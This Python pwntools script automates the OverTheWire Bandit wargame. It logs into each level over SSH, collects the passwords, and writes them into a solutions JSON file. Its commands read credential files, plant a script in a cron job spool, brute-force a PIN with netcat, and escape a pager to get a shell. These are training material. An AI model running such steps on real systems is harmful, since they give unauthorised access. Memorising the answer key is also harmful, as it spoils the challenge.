#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# original: https://github.com/CryptoMoogle/Bandit_Solver/blob/main/bandit.py
# final script by imol.ai

import json
from pwn import *

context.log_level = 'error'

# List of collected flags
flags = ['bandit0']

# ANSI color codes (used for text colors)
Green = '\x1b[32m'
White = '\x1b[37m'
Purple = '\x1b[35m'
Blue = '\x1b[36m'
D_Blue = '\x1b[34m'
Red = '\x1b[31m'
Amber = '\x1b[33m'


################## helper functions ##################

##### lv_connect = establishes a ssh connection #####
# num = int: level value to connect to
# return = connected ssh channel object
def lv_connect(num, raw=False):
	user = 'bandit' + str(num)
	print(Green + f'Starting Bandit Level: ' + str(num) + White)
	return ssh(user, 'bandit.labs.overthewire.org', password=flags[num], port=2220, raw=raw)

##### cmd_run = runs a cmd,  expects no stdout display #####
# cmd = string: command to run
def cmd_run(cmd):
	print(Purple + 'command used: ' + Blue + cmd + White)
	cmd_line.sendline(cmd.encode())
	cmd_line.recvn(2) #remove ' $' from /bin/sh command line

##### cmd_print = runs a cmd, prints stdout display #####
# cmd = string: command to run
# line = int: amount of lines that stdout will display
# return = list of lines received
def cmd_print(cmd, line=1):
	out = []
	cmd_run(cmd)
	for i in range(0, line):
		out.append(cmd_line.recvline().decode('utf-8')[:-1])
		print(Amber + out[i] + White)
	return out

##### print_more = prints un-received stdout data #####
# line = int: amount of lines that stdout will display
# return = list of lines received
def print_more(line=1):
	out = []
	for i in range(0, line):
		out.append(cmd_line.recvline().decode('utf-8'))
		print(Amber + out[i][:-1] + White)
	return out

##### cmd_blind = run command and dumps stdout data #####
# line = int: amount of stdout lines to dump
# data = string: dump stdout up until received "data"
def cmd_blind(cmd, line=None, data=None):
	print(Purple + 'command used: ' + Blue + cmd + White)
	cmd_line.sendline(cmd.encode())
	if line is not None:
		cmd_line.recvlines(line)
	if data is not None:
		cmd_line.recvuntil(data.encode())

##### cmd_wait = pause with visual counter displayed #####
# sec = int: amount of seconds to wait
def cmd_wait(sec):
	print('time elapsed: ' + Amber + '00', end='', flush=True)
	for i in range(1, sec+1):
		time.sleep(1)
		print('\b\b', end='', flush=True)
		print(Amber + str(i).zfill(2), end='', flush=True)
	print('')

##### screen_adjust = changes the height and width #####
# height = int: new screen height (in characters)
# width = int: new screen width (in characters)
def screen_adjust(h, w=80):
	print('\x1b[8;' + str(h) + ';' + str(w) + 't')

##### flag_print = prints flag found and add to list #####
# x = int: start of flag string junk data to remove
# y = neg int: end of flag string junk data to remove
def flag_print(x=0, y=None):
	flag = cmd_data[x:y]
	flags.append(flag)
	print(Green + 'Bandit' + str(lv) + ' flag = ' + Red + flags[lv+1] + White)
	open_lv.close()

############### bandit level functions ###############

def bandit0():
	global open_lv, cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('grep password readme')[0].split(' ')[-1]
	flag_print()

def bandit1():
	global open_lv, cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('cat ./-')[0]
	flag_print()

def bandit2():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('cat spaces\\ in\\ this\\ filename')[0]
	flag_print()

def bandit3():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('cd inhere')
	cmd_data = cmd_print('ls -a')[0]
	cmd_data = cmd_print('cat ' + cmd_data[7:])[0]
	flag_print()

def bandit4():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('cd inhere')
	cmd_data = cmd_print('file ./*', 10)[7]
	cmd_data = cmd_print('cat ' + cmd_data[:-12])[0]
	flag_print()

def bandit5():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('find . -not -executable -size 1033c')[0]
	cmd_data = cmd_print('cat ' + cmd_data)[0]
	flag_print()

def bandit6():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('find / -group bandit6 -user bandit7 -size 33c 2>/dev/null')[0]
	cmd_data = cmd_print('cat ' + cmd_data)[0]
	flag_print()

def bandit7():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('grep "millionth" ./data.txt')[0]
	flag_print(10)

def bandit8():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('sort data.txt | uniq -u')[0]
	flag_print()

def bandit9():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('strings data.txt | grep "========"', 4)[3].split(' ')[-1]
	flag_print()

def bandit10():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('cat data.txt | base64 -d')[0]
	flag_print(16)

def bandit11():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('tr "A-Za-z" "N-ZA-Mn-za-m" < data.txt')[0]
	flag_print(16)

def bandit12():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('rm -r /tmp/Bandit12 2> /dev/null; mkdir /tmp/Bandit12')
	cmd_run('xxd -r data.txt > /tmp/Bandit12/data1.gz')
	cmd_print('file /tmp/Bandit12/data1.gz')
	cmd_run('gzip -c -d /tmp/Bandit12/data1.gz > /tmp/Bandit12/data2.bz2')
	cmd_print('file /tmp/Bandit12/data2.bz2')
	cmd_run('bzip2 -c -d /tmp/Bandit12/data2.bz2 > /tmp/Bandit12/data3.gz')
	cmd_print('file /tmp/Bandit12/data3.gz')
	cmd_run('gzip -c -d /tmp/Bandit12/data3.gz > /tmp/Bandit12/data4.tar')
	cmd_print('file /tmp/Bandit12/data4.tar')
	cmd_print('tar -C /tmp/Bandit12/ -xvf /tmp/Bandit12/data4.tar')
	cmd_run('mv /tmp/Bandit12/data5.bin /tmp/Bandit12/data5.tar')
	cmd_print('file /tmp/Bandit12/data5.tar')
	cmd_print('tar -C /tmp/Bandit12/ -xvf /tmp/Bandit12/data5.tar')
	cmd_run('mv /tmp/Bandit12/data6.bin /tmp/Bandit12/data6.bz2')
	cmd_print('file /tmp/Bandit12/data6.bz2')
	cmd_run('bzip2 -c -d /tmp/Bandit12/data6.bz2 > /tmp/Bandit12/data7.tar')
	cmd_print('file /tmp/Bandit12/data7.tar')
	cmd_print('tar -C /tmp/Bandit12/ -xvf /tmp/Bandit12/data7.tar')
	cmd_run('mv /tmp/Bandit12/data8.bin /tmp/Bandit12/data8.gz')
	cmd_print('file /tmp/Bandit12/data8.gz')
	cmd_run('gzip -c -d /tmp/Bandit12/data8.gz > /tmp/Bandit12/data9.txt')
	cmd_data = cmd_print('cat /tmp/Bandit12/data9.txt')[0]
	flag_print(16)

def bandit13():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_print('ssh bandit14@localhost -i sshkey.private -p 2220 cat /etc/bandit_pass/bandit14', 3)
	cmd_data = cmd_print('yes', 18)[-1]
	flag_print()

def bandit14():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('echo ' + flags[lv] + ' | nc localhost 30000', 2)[1]
	flag_print()

def bandit15():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_print('echo "' + flags[lv] + '" | openssl s_client -connect localhost:30001 -ign_eof')
	cmd_line.recvuntil(b'Correct!')
	cmd_data = print_more(2)[1].strip()
	flag_print()

def bandit16():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_print('nmap -sT -p 31000-32000 localhost', 12)
	cmd_print('echo "' + flags[lv] + '" | openssl s_client -connect localhost:31790 -ign_eof', 69)
	cmd_line.recvuntil(b'Correct!\n')
	cmd_run('echo "' + cmd_line.recvuntil(b'-----END RSA PRIVATE KEY-----').decode() + '" > /tmp/Bandit16.private')
	cmd_line.recvuntil(b'closed\n')
	cmd_print('ls -la /tmp/Bandit16.private')
	cmd_run('chmod 600 /tmp/Bandit16.private')
	cmd_run('cd /tmp')
	cmd_print('ssh bandit17@localhost -i Bandit16.private -p 2220 cat /etc/bandit_pass/bandit17', 3)
	cmd_data = cmd_print('yes', 18)[-1]
	flag_print()

def bandit17():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('diff passwords.old passwords.new',4)[3]
	flag_print(2)

def bandit18():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	print(Purple + 'command used: ' + Blue + f'ssh bandit18@bandit.labs.overthewire.org -t /bin/sh' + White)
	cmd_data = cmd_print('cat readme')[0]
	flag_print()

def bandit19():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_data = cmd_print('./bandit20-do cat /etc/bandit_pass/bandit20')[0]
	flag_print()

def bandit20():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	print(D_Blue + f'shell-1: ', end='')
	cmd_print('echo "' + flags[lv] + '" | nc -lvp 8156')
	tmp_line = cmd_line
	cmd_line = open_lv.system('sh')
	print(D_Blue + f'shell-2: ', end='')
	cmd_print('./suconnect 8156', 2)
	cmd_line = tmp_line
	print(D_Blue + f'shell-1: ', end='')
	cmd_data = print_more(2)[1][:-1]
	flag_print()

def bandit21():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_print('cat /etc/cron.d/cronjob_bandit22', 2)
	cmd_data = cmd_print('cat /usr/bin/cronjob_bandit22.sh', 3)[1]
	cmd_data = cmd_print('cat ' + cmd_data[10:])[0]
	flag_print()

def bandit22():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_print('cat /etc/cron.d/cronjob_bandit23', 2)
	cmd_print('cat /usr/bin/cronjob_bandit23.sh', 8)
	cmd_run("bandit23=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)")
	cmd_data = cmd_print('echo $bandit23')[0]
	cmd_data = cmd_print('cat /tmp/' + cmd_data)[0]
	flag_print()

def bandit23():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_print('cat /etc/cron.d/cronjob_bandit24', 2)
	cmd_print('cat /usr/bin/cronjob_bandit24.sh', 19)
	cmd_run('echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit241234567.txt" > /var/spool/bandit24/foo/bandit24123.sh')
	cmd_run('chmod 777 /var/spool/bandit24/foo/bandit24123.sh')
	print(Purple + 'waiting for 60 seconds to ensure cron-tab has run')
	cmd_wait(60)
	cmd_data = cmd_print('cat /tmp/bandit241234567.txt')[0]
	flag_print()

def bandit24():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('bash')
	cmd_run('for i in {0000..9999}; do echo "' + flags[lv] + ' $i"; done | nc localhost 30002')
	cmd_line.recvuntil(b'Correct!')
	cmd_data = print_more(2)[1]
	flag_print(33,-1)

def bandit25():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('stty rows 4')
	cmd_print('ssh bandit26@localhost -i bandit26.sshkey -p 2220', 3)
	cmd_print('yes')
	cmd_line.recvuntil(b'--More--')
	cmd_line.send(b'v')
	cmd_blind(':set shell=/bin/sh')
	cmd_blind(':shell')
	cmd_line.recvuntil(b'$ ')
	cmd_line.sendline(b'cat /etc/bandit_pass/bandit26')
	cmd_data = cmd_line.recvline().decode()[:-1]
	flag_print()

def bandit26():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv-1)
	cmd_line = open_lv.system('sh')
	cmd_run('stty rows 4')
	cmd_print('ssh bandit26@localhost -i bandit26.sshkey -p 2220', 3)
	cmd_print('yes')
	cmd_line.recvuntil(b'--More--')
	cmd_line.send(b'v')
	cmd_blind(':set shell=/bin/sh')
	cmd_blind(':shell')
	cmd_line.recvuntil(b'$ ')
	cmd_line.sendline(b'./bandit27-do cat /etc/bandit_pass/bandit27')
	cmd_data = cmd_line.recvline().decode()[:-1]
	flag_print()

def bandit27():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('rm -rf /tmp/Bandit27 2> /dev/null; mkdir /tmp/Bandit27; cd /tmp/Bandit27')
	cmd_print('git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo', 4)
	cmd_print('yes')
	cmd_line.recvuntil(b"localhost's password:")
	cmd_print(flags[lv], 5)
	cmd_run('cd repo')
	cmd_data = cmd_print('cat README')[0]
	flag_print(35)

def bandit28():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('rm -rf /tmp/Bandit28 2> /dev/null; mkdir /tmp/Bandit28; cd /tmp/Bandit28')
	cmd_print('git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo', 4)
	cmd_print('yes')
	cmd_line.recvuntil(b"localhost's password:")
	cmd_print(flags[lv], 6)
	cmd_run('cd repo')
	cmd_data = cmd_print('git show | grep password', 2)[0]
	flag_print(13)

def bandit29():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('rm -rf /tmp/Bandit29 2> /dev/null; mkdir /tmp/Bandit29; cd /tmp/Bandit29')
	cmd_print('git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo', 4)
	cmd_print('yes')
	cmd_line.recvuntil(b"localhost's password:")
	cmd_print(flags[lv], 6)
	cmd_run('cd repo')
	cmd_print('git branch -r', 4)
	cmd_print('git checkout dev', 2)
	cmd_data = cmd_print('cat README.md', 7)[6]
	flag_print(12)

def bandit30():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('rm -rf /tmp/Bandit30 2> /dev/null; mkdir /tmp/Bandit30; cd /tmp/Bandit30')
	cmd_print('git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo', 4)
	cmd_print('yes')
	cmd_line.recvuntil(b"localhost's password:")
	cmd_print(flags[lv], 4)
	cmd_run('cd repo')
	cmd_print('git tag')
	cmd_data = cmd_print('git show secret')[0]
	flag_print(19, -4)

def bandit31():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv)
	cmd_line = open_lv.system('sh')
	cmd_run('rm -rf /tmp/Bandit31 2> /dev/null; mkdir /tmp/Bandit31; cd /tmp/Bandit31')
	cmd_print('git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo', 4)
	cmd_print('yes')
	cmd_line.recvuntil(b"localhost's password:")
	cmd_print(flags[lv], 5)
	cmd_run('cd repo')
	cmd_print('cat README.md', 7)
	cmd_run('echo "May I come in?" > key.txt')
	cmd_run('git add key.txt -f')
	cmd_print('git commit -m "Upload file"', 3)
	cmd_print('git push', 3)
	cmd_print('yes', 4)
	cmd_line.recvuntil(b"localhost's password:")
	cmd_data = cmd_print(flags[lv], 12)[11].split(' ')[1]
	flag_print()

def bandit32():
	global open_lv , cmd_line, cmd_data
	open_lv = lv_connect(lv, raw=True)
	cmd_line = open_lv.system('sh')
	cmd_print('', 2)
	cmd_print('$0')
	cmd_print('ls -la', 8)
	cmd_data = cmd_print('cat /etc/bandit_pass/bandit33', 2)[1]
	flag_print(y=-1)

def bandit33():
	# "Congratulations on solving the last level of this game!"
	pass


################# Runner #################
if __name__ == '__main__':
	try:
		for lv in range(0, 33):
			eval('bandit'+str(lv))()
	finally:
		print(flags)

		with open("bandit.json", "r") as file:
			data = json.load(file)
		for i in data:
			if len(flags) > i['id']:
				i["target"] = f"sshpass -p {flags[i['id']]} ssh bandit{i['id']}@bandit.labs.overthewire.org -p 2220"
			if len(flags) > i['id']+1:
				i["flag"] = flags[i['id']+1]
		with open('bandit_solved.json', 'w') as filp:
			json.dump(data, filp, indent='\t')
